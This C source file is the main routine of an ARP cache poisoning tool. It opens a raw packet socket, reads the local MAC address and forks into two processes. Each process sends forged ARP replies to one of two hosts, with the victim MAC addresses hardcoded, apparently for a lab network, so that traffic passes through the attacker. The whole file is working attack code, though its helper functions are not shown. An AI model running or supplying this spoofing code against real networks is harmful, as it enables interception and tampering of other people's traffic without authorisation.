#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <sys/types.h> 
#include <unistd.h> 
#include "arp_poisoning.h"
#include "network.h"

int			main(int argc, char *argv[])
{
  char			*victim_ip, *spoofed_ip_source, *interface;
  uint8_t		*my_mac_address, *victim_mac_address;
  struct sockaddr_ll	device;
  int			sd;

  if (argc != 4)
    return -1;

  spoofed_ip_source = argv[1]; victim_ip = argv[2]; interface = argv[3];

  if ((sd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
    return (fprintf(stderr, "ERROR_SOCKET_CREATION"), EXIT_FAILURE);

  if (!(my_mac_address = get_my_mac_address(sd, interface)))
    return (fprintf(stderr, "ERROR_GET_MAC"), EXIT_FAILURE);

  memset(&device, 0, sizeof device);

  get_index_from_interface(&device, interface);

  victim_mac_address = malloc(sizeof(uint8_t) * HARDWARE_LENGTH);

  if(fork() == 0)
  {
    victim_mac_address[0] = 0x00;
    victim_mac_address[1] = 0x00;
    victim_mac_address[2] = 0x00;
    victim_mac_address[3] = 0xaa;
    victim_mac_address[4] = 0x00;
    victim_mac_address[5] = 0x02;
    
    printf("MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
         victim_mac_address[0] & 0xff, victim_mac_address[1] & 0xff, victim_mac_address[2] & 0xff,
         victim_mac_address[3] & 0xff, victim_mac_address[4] & 0xff, victim_mac_address[5] & 0xff);

    send_payload_to_victim(sd, &device, my_mac_address, spoofed_ip_source, victim_mac_address, victim_ip);
  }
  else
  {
    victim_mac_address[0] = 0x00;
    victim_mac_address[1] = 0x00;
    victim_mac_address[2] = 0x00;
    victim_mac_address[3] = 0xaa;
    victim_mac_address[4] = 0x00;
    victim_mac_address[5] = 0x04;

    printf("MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
         victim_mac_address[0] & 0xff, victim_mac_address[1] & 0xff, victim_mac_address[2] & 0xff,
         victim_mac_address[3] & 0xff, victim_mac_address[4] & 0xff, victim_mac_address[5] & 0xff);

    send_payload_to_victim(sd, &device, my_mac_address, victim_ip, victim_mac_address, spoofed_ip_source);
  }
  
  return 0;
}
